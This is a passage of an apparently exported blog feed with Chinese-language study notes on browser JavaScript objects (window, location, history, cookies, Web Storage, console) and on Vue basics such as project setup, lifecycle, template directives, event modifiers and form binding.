<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="variable language_">window</span>.<span class="property">innerHeight</span> <span class="comment">// 浏览器窗口的内部高度(包括滚动条)</span></span><br><span class="line"><span class="variable language_">window</span>.<span class="property">innerWidth</span>  <span class="comment">// 浏览器窗口的内部宽度(包括滚动条)</span></span><br><span class="line"></span><br><span class="line"><span class="variable language_">window</span>.<span class="title function_">open</span>() <span class="comment">// 打开新窗口</span></span><br><span class="line"><span class="variable language_">window</span>.<span class="title function_">close</span>() <span class="comment">// 关闭当前窗口</span></span><br><span class="line"><span class="variable language_">window</span>.<span class="title function_">moveTo</span>() <span class="comment">// 移动当前窗口</span></span><br><span class="line"><span class="variable language_">window</span>.<span class="title function_">resizeTo</span>() <span class="comment">// 调整当前窗口的尺寸</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 下面为window的子对象，window可以省略</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 以像素计，减去界面特性，比如窗口任务栏。</span></span><br><span class="line">screen.<span class="property">availWidth</span> <span class="comment">// 可用的屏幕宽度</span></span><br><span class="line">screen.<span class="property">availHeight</span> <span class="comment">// 可用的屏幕高度</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 用于获得当前页面的地址 (URL)，并把浏览器重定向到新的页面。</span></span><br><span class="line">location.<span class="property">hostname</span> <span class="comment">// 返回 web 主机的域名</span></span><br><span class="line">location.<span class="property">pathname</span> <span class="comment">// 返回当前页面的路径和文件名</span></span><br><span class="line">location.<span class="property">port</span> <span class="comment">// 返回 web 主机的端口 （80 或 443）</span></span><br><span class="line">location.<span class="property">protocol</span> <span class="comment">// 返回所使用的 web 协议（http: 或 https:）</span></span><br><span class="line">location.<span class="property">href</span>  <span class="comment">// 返回当前页面的 URL。</span></span><br><span class="line">location.<span class="title function_">assign</span>()  <span class="comment">//  加载新的文档。</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 浏览器的历史。</span></span><br><span class="line">history.<span class="title function_">back</span>() <span class="comment">// 与在浏览器点击后退按钮相同</span></span><br><span class="line">history.<span class="title function_">forward</span>() <span class="comment">// 与在浏览器中点击向前按钮相同</span></span><br><span class="line">history.<span class="title function_">go</span>() <span class="comment">// 前进或后退几页</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 有关访问者浏览器的信息。</span></span><br><span class="line">navigator.<span class="property">appCodeName</span></span><br><span class="line">navigator.<span class="property">appName</span></span><br><span class="line">navigator.<span class="property">appVersion</span></span><br><span class="line">navigator.<span class="property">cookieEnabled</span></span><br><span class="line">navigator.<span class="property">platform</span></span><br><span class="line">navigator.<span class="property">userAgent</span></span><br><span class="line">navigator.<span class="property">systemLanguage</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 弹窗</span></span><br><span class="line"><span class="title function_">alert</span>()</span><br><span class="line"><span class="title function_">confirm</span>()  <span class="comment">// 点确认返回 true</span></span><br><span class="line"><span class="title function_">prompt</span>()   <span class="comment">// 输入框</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 时间间隔</span></span><br><span class="line"><span class="comment">// 间隔指定的毫秒数不停地执行指定的代码</span></span><br><span class="line"><span class="keyword">var</span> intervalVariable = <span class="built_in">setInterval</span>(<span class="string">&quot;javascript function&quot;</span>, milliseconds);</span><br><span class="line"><span class="built_in">clearInterval</span>(intervalVariable)</span><br><span class="line"><span class="comment">// 在指定的毫秒数后执行指定代码</span></span><br><span class="line"><span class="keyword">var</span> intervalVariable= <span class="variable language_">window</span>.<span class="built_in">setTimeout</span>(<span class="string">&quot;javascript function&quot;</span>, milliseconds);</span><br><span class="line"><span class="built_in">clearTimeout</span>(intervalVariable)</span><br><span class="line"></span><br><span class="line"><span class="comment">// Cookie</span></span><br><span class="line"><span class="variable language_">document</span>.<span class="property">cookie</span>=<span class="string">&quot;username=John Doe;&quot;</span>  <span class="comment">// 创建</span></span><br><span class="line"><span class="keyword">var</span> x = <span class="variable language_">document</span>.<span class="property">cookie</span>   <span class="comment">// 获取</span></span><br><span class="line"><span class="variable language_">document</span>.<span class="property">cookie</span>=<span class="string">&quot;username=;&quot;</span>   <span class="comment">// 删除</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="存储对象"><a href="#存储对象" class="headerlink" title="存储对象"></a>存储对象</h2><p>Web 存储 API 提供了 sessionStorage （会话存储） 和 localStorage（本地存储）两个存储对象来对网页的数据进行添加、删除、修改、查询操作。</p>
<p>localStorage 用于长久保存整个网站的数据，保存的数据没有过期时间，直到手动去除。</p>
<p>sessionStorage 用于临时保存同一窗口(或标签页)的数据，在关闭窗口或标签页之后将会删除这些数据。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">length  <span class="comment">// 存储多少数据</span></span><br><span class="line"></span><br><span class="line"><span class="title function_">key</span>(n)  <span class="comment">// 返回存储对象中第 n 个键的名称</span></span><br><span class="line"><span class="title function_">getItem</span>(keyname)  <span class="comment">// 返回指定键的值</span></span><br><span class="line"><span class="title function_">setItem</span>(keyname, value)  <span class="comment">// 添加键和值，如果对应的值存在，则更新该键对应的值。</span></span><br><span class="line"><span class="title function_">removeItem</span>(keyname)  <span class="comment">// 移除键</span></span><br><span class="line"><span class="title function_">clear</span>()  <span class="comment">// 清除存储对象中所有的键</span></span><br></pre></td></tr></table></figure>

<h2 id="Console"><a href="#Console" class="headerlink" title="Console"></a>Console</h2><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="title function_">assert</span>()  <span class="comment">// 断言</span></span><br><span class="line"><span class="title function_">clear</span>()</span><br><span class="line"><span class="title function_">count</span>()   <span class="comment">// 记录该函数调用次数</span></span><br><span class="line"><span class="title function_">error</span>()</span><br><span class="line"><span class="title function_">warn</span>()</span><br><span class="line"><span class="title function_">info</span>()</span><br><span class="line"><span class="title function_">log</span>()</span><br><span class="line"><span class="title function_">time</span>()     <span class="comment">// 开始计时</span></span><br><span class="line"><span class="title function_">timeEnd</span>()  <span class="comment">// 计时结束</span></span><br><span class="line"><span class="title function_">trace</span>()    <span class="comment">// 打印堆栈</span></span><br><span class="line"><span class="title function_">table</span>()    <span class="comment">// 表格形式显示数据</span></span><br></pre></td></tr></table></figure>

<h2 id="其他对象"><a href="#其他对象" class="headerlink" title="其他对象"></a>其他对象</h2><p><a href="https://www.runoob.com/jsref/dom-obj-document.html">Document</a></p>
<p><a href="https://www.runoob.com/jsref/dom-obj-all.html">DOM 节点</a></p>
<p><a href="https://www.runoob.com/jsref/dom-obj-attributes.html">属性 对象</a></p>
<p><a href="https://www.runoob.com/jsref/dom-obj-event.html">事件</a></p>
<p><a href="https://www.runoob.com/jsref/obj-cssstyledeclaration.html">CSS</a></p>
]]></content>
      <categories>
        <category>前端</category>
      </categories>
      <tags>
        <tag>Javascript</tag>
      </tags>
  </entry>
  <entry>
    <title>Javascript 其他</title>
    <url>/2020/02/19/%E5%89%8D%E7%AB%AF/JsOthers/</url>
    <content><![CDATA[<p>…</p>
<span id="more"></span>

<h1 id="Angular"><a href="#Angular" class="headerlink" title="Angular"></a>Angular</h1><h1 id="React"><a href="#React" class="headerlink" title="React"></a>React</h1><h1 id="NodeJS"><a href="#NodeJS" class="headerlink" title="NodeJS"></a>NodeJS</h1><h1 id="Worker"><a href="#Worker" class="headerlink" title="Worker"></a>Worker</h1><h1 id="WebGL"><a href="#WebGL" class="headerlink" title="WebGL"></a>WebGL</h1><h1 id="库"><a href="#库" class="headerlink" title="库"></a>库</h1><p>tone.js</p>
<p>three.js</p>
<p>echarts.js</p>
<p>highcharts.js</p>
<p>lodash.js</p>
<p>anime.js</p>
<h1 id="WebSocket"><a href="#WebSocket" class="headerlink" title="WebSocket"></a>WebSocket</h1><h1 id="Tensorflow"><a href="#Tensorflow" class="headerlink" title="Tensorflow"></a>Tensorflow</h1>]]></content>
      <categories>
        <category>前端</category>
      </categories>
      <tags>
        <tag>Javascript</tag>
      </tags>
  </entry>
  <entry>
    <title>Vue</title>
    <url>/2020/02/19/%E5%89%8D%E7%AB%AF/Vue/</url>
    <content><![CDATA[<p>…</p>
<span id="more"></span>

<h1 id="VUE"><a href="#VUE" class="headerlink" title="VUE"></a>VUE</h1><p><a href="https://cn.vuejs.org/v2/guide/instance.html">Vue 官网</a></p>
<p><a href="https://cn.vuejs.org/v2/api/">Vue API</a></p>
<h1 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h1><p>Vue 不支持 IE8 及以下版本，因为 Vue 使用了 IE8 无法模拟的 ECMAScript 5 特性。</p>
<p>使用npm安装：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">npm install vue </span><br></pre></td></tr></table></figure>

<p>创建项目</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">vue create app_name</span><br><span class="line"><span class="comment"># 选手动选择特性</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Babel，编译工具，必选</span></span><br><span class="line"><span class="comment"># TypeScript，可选</span></span><br><span class="line"><span class="comment"># PWA Support，让页面接近原生应用，可选</span></span><br><span class="line"><span class="comment"># Router，必选</span></span><br><span class="line"><span class="comment"># Vuex，必选</span></span><br><span class="line"><span class="comment"># CSS Pre-processors，必选</span></span><br><span class="line"><span class="comment"># Linter / Formatter，代码检测和格式化，可选</span></span><br><span class="line"><span class="comment"># Unit Testing，必选</span></span><br><span class="line"><span class="comment"># E2E Testing，端到端测试，可选</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用 History Mode</span></span><br><span class="line"><span class="comment"># 是</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># CSS 预处理器</span></span><br><span class="line"><span class="comment"># SCSS/SASS</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># ESLint 风格</span></span><br><span class="line"><span class="comment"># 标准</span></span><br><span class="line"><span class="comment"># 保存时检测</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 单元测试</span></span><br><span class="line"><span class="comment"># Jest</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 配置保存位置</span></span><br><span class="line"><span class="comment"># 保存到各自的位置</span></span><br></pre></td></tr></table></figure>

<p>创建好的APP目录如下：</p>
<ul>
<li>app_name<ul>
<li>node_modules&#x2F;</li>
<li>public&#x2F;<ul>
<li>favicon.ico</li>
<li>index.html</li>
</ul>
</li>
<li>src&#x2F;<ul>
<li>assets&#x2F;      资源文件<ul>
<li>logo.png</li>
</ul>
</li>
<li>components&#x2F;  公共组件<ul>
<li>HelloWorld.vue</li>
</ul>
</li>
<li>router&#x2F;      前端路由<ul>
<li>index.js</li>
</ul>
</li>
<li>store&#x2F;       应用数据 state<ul>
<li>index.js</li>
</ul>
</li>
<li>views&#x2F;       页面目录<ul>
<li>About.vue  </li>
<li>Home.vue</li>
</ul>
</li>
<li>App.vue      根 APP</li>
<li>main.js      项目入口</li>
</ul>
</li>
<li>tests&#x2F;<ul>
<li>unit<ul>
<li>example.spec.js</li>
</ul>
</li>
</ul>
</li>
<li>.browserslistrc</li>
<li>.gitignore</li>
<li>babel.config.js</li>
<li>jest.config.js</li>
<li>package-lock.json</li>
<li>package.json</li>
<li>README.md</li>
</ul>
</li>
</ul>
<h1 id="Vue-实例-生命周期"><a href="#Vue-实例-生命周期" class="headerlink" title="Vue 实例 生命周期"></a>Vue 实例 生命周期</h1><ol>
<li>new Vue()</li>
<li>初始化：事件，声明周期</li>
<li>beforeCreate()</li>
<li>初始化，注入，校验</li>
<li>created</li>
<li>是否指定 el </li>
<li>是否指定 template</li>
<li>将template&#x2F;el翻译渲染</li>
<li>beforeMount</li>
<li>创建vm.$el，并替换el</li>
<li>mounted</li>
<li>挂载完毕</li>
<li>data被修改</li>
<li>beforeUpdate</li>
<li>重新渲染</li>
<li>updated</li>
<li>beforeDestroy</li>
<li>解除绑定，销毁子组件</li>
<li>destroyed</li>
</ol>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">template</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;hello&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h1</span>&gt;</span>&#123;&#123; msg &#125;&#125;<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">template</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">export</span> <span class="keyword">default</span> &#123;</span></span><br><span class="line"><span class="language-javascript">  <span class="attr">name</span>: <span class="string">&#x27;HelloWorld&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">  <span class="attr">props</span>: &#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="attr">msg</span>: <span class="title class_">String</span></span></span><br><span class="line"><span class="language-javascript">  &#125;</span></span><br><span class="line"><span class="language-javascript">&#125;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">style</span> <span class="attr">scoped</span> <span class="attr">lang</span>=<span class="string">&quot;scss&quot;</span>&gt;</span><span class="language-css"></span></span><br><span class="line"><span class="language-css"><span class="selector-tag">h1</span> &#123;</span></span><br><span class="line"><span class="language-css">  <span class="attribute">margin</span>: <span class="number">40px</span> <span class="number">0</span> <span class="number">0</span>;</span></span><br><span class="line"><span class="language-css">&#125;</span></span><br><span class="line"><span class="language-css"></span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>


<h1 id="模板"><a href="#模板" class="headerlink" title="模板"></a>模板</h1><p>插值：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">&#123;&#123; msg &#125;&#125;</span><br><span class="line">&#123;&#123; message.split(&#x27;&#x27;).reverse().join(&#x27;&#x27;) &#125;&#125;</span><br></pre></td></tr></table></figure>

<p>指令：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">span</span> <span class="attr">v-html</span>=<span class="string">&quot;rawHtml&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">span</span> <span class="attr">v-once</span>&gt;</span>这个将不会改变: &#123;&#123; msg &#125;&#125;<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">v-bind:id</span>=<span class="string">&quot;dynamicId&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">button</span> <span class="attr">:disabled</span>=<span class="string">&quot;isButtonDisabled&quot;</span>&gt;</span>Button<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">v-on:click</span>=<span class="string">&quot;doSomething&quot;</span>&gt;</span>...<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> @<span class="attr">click</span>=<span class="string">&quot;doSomething&quot;</span>&gt;</span>...<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> @<span class="attr">submit.prevent</span>=<span class="string">&quot;onSubmit&quot;</span>&gt;</span>...<span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- 2.6.0 新增 --&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 这里的 attributeName 会被作为一个 JavaScript 表达式进行动态求值，求得的值将会作为最终的参数来使用。 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">v-bind:</span>[<span class="attr">attributeName</span>]=<span class="string">&quot;url&quot;</span>&gt;</span> ... <span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>Class与Style：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">:class</span>=<span class="string">&quot;&#123; active: isActive &#125;&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span></span></span><br><span class="line"><span class="tag">  <span class="attr">class</span>=<span class="string">&quot;static&quot;</span></span></span><br><span class="line"><span class="tag">  <span class="attr">v-bind:class</span>=<span class="string">&quot;&#123; active: isActive, &#x27;text-danger&#x27;: hasError &#125;&quot;</span></span></span><br><span class="line"><span class="tag">&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">:style</span>=<span class="string">&quot;&#123; color: activeColor, fontSize: fontSize + &#x27;px&#x27; &#125;&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">:style</span>=<span class="string">&quot;&#123; display: [&#x27;-webkit-box&#x27;, &#x27;-ms-flexbox&#x27;, &#x27;flex&#x27;] &#125;&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>条件渲染：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">p</span> <span class="attr">v-if</span>=<span class="string">&quot;seen&quot;</span>&gt;</span>现在你看到我了<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span> <span class="attr">v-else-if</span>=<span class="string">&quot;ok&quot;</span>&gt;</span>Oh no<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span> <span class="attr">v-else</span>&gt;</span>Oh no<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span> <span class="attr">v-show</span>=<span class="string">&quot;ok&quot;</span>&gt;</span>Hello!<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- v-if是惰性的，v-show则会直接渲染，不论条件如何 --&gt;</span></span><br></pre></td></tr></table></figure>

<p>列表渲染：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">li</span> <span class="attr">v-for</span>=<span class="string">&quot;item in items&quot;</span> <span class="attr">:key</span>=<span class="string">&quot;item.id&quot;</span>&gt;</span></span><br><span class="line">  &#123;&#123; item.message &#125;&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">li</span> <span class="attr">v-for</span>=<span class="string">&quot;(item, index) in items&quot;</span> <span class="attr">:key</span>=<span class="string">&quot;item.id&quot;</span>&gt;</span></span><br><span class="line">  &#123;&#123; item.message &#125;&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>监听事件：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">button</span> @<span class="attr">click</span>=<span class="string">&quot;counter += 1&quot;</span>&gt;</span>Add 1<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">button</span> @<span class="attr">click</span>=<span class="string">&quot;greet&quot;</span>&gt;</span>Greet<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">button</span> @<span class="attr">click</span>=<span class="string">&quot;say(&#x27;hello&#x27;, $event)&quot;</span>&gt;</span>Greet<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 鼠标事件 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> @<span class="attr">click.left</span>=<span class="string">&quot;submit&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> @<span class="attr">click.right</span>=<span class="string">&quot;submit&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> @<span class="attr">click.middle</span>=<span class="string">&quot;submit&quot;</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 阻止单击事件继续传播 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> @<span class="attr">click.stop</span>=<span class="string">&quot;doThis&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 提交事件不再重载页面 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> @<span class="attr">submit.prevent</span>=<span class="string">&quot;onSubmit&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 修饰符可以串联 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> @<span class="attr">click.stop.prevent</span>=<span class="string">&quot;doThat&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 只有修饰符 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> @<span class="attr">submit.prevent</span>&gt;</span><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 添加事件监听器时使用事件捕获模式 --&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 即内部元素触发的事件先在此处理，然后才交由内部元素进行处理 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> @<span class="attr">click.capture</span>=<span class="string">&quot;doThis&quot;</span>&gt;</span>...<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 只当在 event.target 是当前元素自身时触发处理函数 --&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 即事件不是从内部元素触发的 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> @<span class="attr">click.self</span>=<span class="string">&quot;doThat&quot;</span>&gt;</span>...<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 只有在 `key` 是 `Enter` 时调用 `vm.submit()` --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> @<span class="attr">keyup.enter</span>=<span class="string">&quot;submit&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> &#123;</span><br><span class="line">  <span class="attr">name</span>: <span class="string">&#x27;HelloWorld&#x27;</span>,</span><br><span class="line">  <span class="attr">methods</span>: &#123;</span><br><span class="line">    <span class="attr">greet</span>: <span class="keyword">function</span> (<span class="params">event</span>) &#123;</span><br><span class="line">      <span class="title function_">alert</span>(<span class="string">&#x27;Hello &#x27;</span> + <span class="variable language_">this</span>.<span class="property">name</span> + <span class="string">&#x27;!&#x27;</span>)</span><br><span class="line">      <span class="keyword">if</span> (event) &#123;      <span class="comment">// `event` 是原生 DOM 事件</span></span><br><span class="line">        <span class="title function_">alert</span>(event.<span class="property">target</span>.<span class="property">tagName</span>)</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">say</span>: <span class="keyword">function</span> (<span class="params">message, event</span>) &#123;</span><br><span class="line">      <span class="title function_">alert</span>(message)</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>表单输入绑定：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 输入框 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">v-model</span>=<span class="string">&quot;message&quot;</span> <span class="attr">placeholder</span>=<span class="string">&quot;edit me&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>Message is: &#123;&#123; message &#125;&#125;<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 复选框 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;checkbox&quot;</span> <span class="attr">id</span>=<span class="string">&quot;checkbox&quot;</span> <span class="attr">v-model</span>=<span class="string">&quot;checked&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">&quot;checkbox&quot;</span>&gt;</span>&#123;&#123; checked &#125;&#125;<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 单选框 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;example-4&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;radio&quot;</span> <span class="attr">id</span>=<span class="string">&quot;one&quot;</span> <span class="attr">value</span>=<span class="string">&quot;One&quot;</span> <span class="attr">v-model</span>=<span class="string">&quot;picked&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">&quot;one&quot;</span>&gt;</span>One<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;radio&quot;</span> <span class="attr">id</span>=<span class="string">&quot;two&quot;</span> <span class="attr">value</span>=<span class="string">&quot;Two&quot;</span> <span class="attr">v-model</span>=<span class="string">&quot;picked&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">&quot;two&quot;</span>&gt;</span>Two<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">span</span>&gt;</span>Picked: &#123;&#123; picked &#125;&#125;<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 选择框 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;example-5&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">select</span> <span class="attr">v-model</span>=<span class="string">&quot;selected&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">option</span> <span class="attr">disabled</span> <span class="attr">value</span>=<span class="string">&quot;&quot;</span>&gt;</span>请选择<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">option</span>&gt;</span>A<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">option</span>&gt;</span>B<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">option</span>&gt;</span>C<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">select</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">span</span>&gt;</span>Selected: &#123;&#123; selected &#125;&#125;<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- 修饰符 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">v-model.lazy</span>=<span class="string">&quot;msg&quot;</span> &gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">v-model.number</span>=<span class="string">&quot;age&quot;</span> <span class="attr">type</span>=<span class="string">&quot;number&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">v-model.trim</span>=<span class="string">&quot;msg&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h1 id="组件"><a href="#组件" class="headerlink" title="组件"></a>组件</h1><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 组件的data必须是一个函数</span></span><br><span class="line"><span class="attr">data</span>: <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">return</span> &#123;</span><br><span class="line">    <span class="attr">count</span>: <span class="number">0</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;,</span><br><span class="line"><span class="comment">// 一个组件默认可以拥有任意数量的 prop，任何值都可以传递给任何 prop。</span></span><br><span class="line"><span class="attr">props</span>: [<span class="string">&#x27;title&#x27;</span>],</span><br></pre></td></tr></table></figure>

<p>子组件可以通过emit触发事件：</p>
